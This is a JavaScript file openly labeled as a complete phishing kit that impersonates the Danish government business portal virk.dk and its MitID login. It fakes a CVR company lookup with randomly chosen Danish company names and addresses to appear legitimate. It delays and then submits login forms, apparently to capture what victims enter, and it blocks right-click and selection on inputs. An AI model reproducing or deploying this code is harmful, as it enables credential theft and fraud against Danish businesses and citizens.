// ============================================
// VIRK.DK PHISHING - COMPLETE JAVASCRIPT
// ============================================

// Handle CVR search
function handleSearch(event) {
    event.preventDefault();
    
    const cvrInput = document.getElementById('cvrNumber');
    const cvrValue = cvrInput.value.trim();
    
    // Validate CVR (8 digits)
    if (!/^\d{8}$/.test(cvrValue)) {
        alert('Indtast venligst et gyldigt CVR-nummer (8 cifre)');
        return false;
    }
    
    // Show results section
    document.getElementById('searchResults').style.display = 'block';
    document.getElementById('loadingSpinner').style.display = 'block';
    document.getElementById('companyResult').style.display = 'none';
    document.getElementById('noResult').style.display = 'none';
    
    // Simulate search delay
    setTimeout(() => {
        document.getElementById('loadingSpinner').style.display = 'none';
        
        // For demo purposes, always show a result
        // In production, you could query proff.dk API here
        document.getElementById('companyResult').style.display = 'block';
        
        // Generate fake company name based on CVR
        const companyNames = [
            'Dansk Erhverv A/S',
            'Nordisk Handel ApS',
            'København Consulting IVS',
            'Aarhus Teknik A/S',
            'Odense Service ApS',
            'Aalborg Handel A/S',
            'Esbjerg Transport ApS',
            'Randers Byg A/S'
        ];
        
        const randomName = companyNames[Math.floor(Math.random() * companyNames.length)];
        const randomAddress = ['Hovedgaden 123', 'Industrivej 45', 'Strandvejen 89', 'Torvet 12'][Math.floor(Math.random() * 4)];
        const randomCity = ['København', 'Aarhus', 'Odense', 'Aalborg'][Math.floor(Math.random() * 4)];
        const randomPostal = ['1000', '8000', '5000', '9000'][Math.floor(Math.random() * 4)];
        
        document.getElementById('companyName').textContent = randomName;
        document.getElementById('resultCVR').textContent = cvrValue;
        document.getElementById('companyAddress').textContent = `${randomAddress}, ${randomPostal} ${randomCity}`;
        
    }, 2000);
    
    return false;
}

// Form submission animations
document.addEventListener('DOMContentLoaded', function() {
    const forms = document.querySelectorAll('form');
    
    forms.forEach(form => {
        if (form.id !== 'cvrSearchForm') {
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const button = this.querySelector('.mitid-button, .search-button');
                if (button) {
                    const buttonText = button.querySelector('.button-text');
                    const buttonLoader = button.querySelector('.button-loader');
                    
                    if (buttonText && buttonLoader) {
                        buttonText.style.display = 'none';
                        buttonLoader.style.display = 'flex';
                        button.disabled = true;
                    }
                    
                    // Submit after delay
                    setTimeout(() => {
                        this.submit();
                    }, 2000);
                }
            });
        }
    });
});

// Prevent right-click on sensitive elements
document.addEventListener('contextmenu', function(e) {
    if (e.target.tagName === 'IMG' || e.target.tagName === 'INPUT') {
        e.preventDefault();
    }
});

// Disable text selection on sensitive data
document.addEventListener('selectstart', function(e) {
    if (e.target.tagName === 'INPUT' && e.target.type === 'password') {
        e.preventDefault();
    }
});
